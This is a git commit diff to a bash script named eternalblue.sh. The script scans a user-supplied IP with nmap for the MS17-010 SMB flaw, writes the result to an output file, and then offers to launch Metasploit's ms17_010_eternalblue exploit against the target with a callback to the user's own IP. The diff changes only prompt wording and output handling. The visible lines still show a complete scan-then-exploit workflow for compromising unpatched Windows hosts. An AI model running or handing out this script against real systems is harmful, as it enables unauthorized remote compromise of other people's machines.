1211d13183e103f0b10677b0d9444b3cde756819
al0k1n <91440074+al0k1n@users.noreply.github.com>
2024-04-06 12:24:27 +0300

    Update eternalblue.sh

--- eternalblue.sh
+++ eternalblue.sh
@@ -9,20 +9,22 @@ if ! command -v msfconsole &> /dev/null; then
     exit 1
 fi
 
+    output_directory="outputs"
+    output_file="eternalblue_out.txt"
+    
     #my_ip=$(ip addr show | grep 'inet 192' | awk '{print $2}' | cut -d'/' -f1)
     echo "Check the target for the EternalBlue vulnerability"
-    echo -n "Write the IP: "
+    echo -n "Enter the target's IP address: "
     read target
     result=$(nmap -p 445 --script smb-vuln-ms17-010.nse $target | grep "State: VULNERABLE")
 
     if [ -n "$result" ]; then
-        echo "BINGO!!! $target can be hacked using EternalBlue" > "eternalblue_out.txt"
-        echo "BINGO!!! $target can be hacked using EternalBlue"
+        echo "BINGO!!! $target can be hacked using EternalBlue" | tee "$output_directory/$output_file"
         
         while true; do
             read -p "Do you want to launch an attack? (Yes/No): " continue_input
             if [ "$continue_input" == "Yes" ]; then
-                echo -n "Write your IP: "
+                echo -n "Enter your IP address: "
                 read ip
                 echo "The hacking BEGINS..."
                 msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $target; set processname lsass.exe; set LHOST $ip; run; exit"
@@ -35,6 +37,5 @@ fi
             fi
         done
     else
-        echo "Unlucky...$target cant be hacked using EternalBlue" > "eternalblue_out.txt"
-        echo "Unlucky...$target cant be hacked using EternalBlue"
+        echo "Unlucky...$target cant be hacked using EternalBlue" | tee "$output_directory/$output_file"
     fi
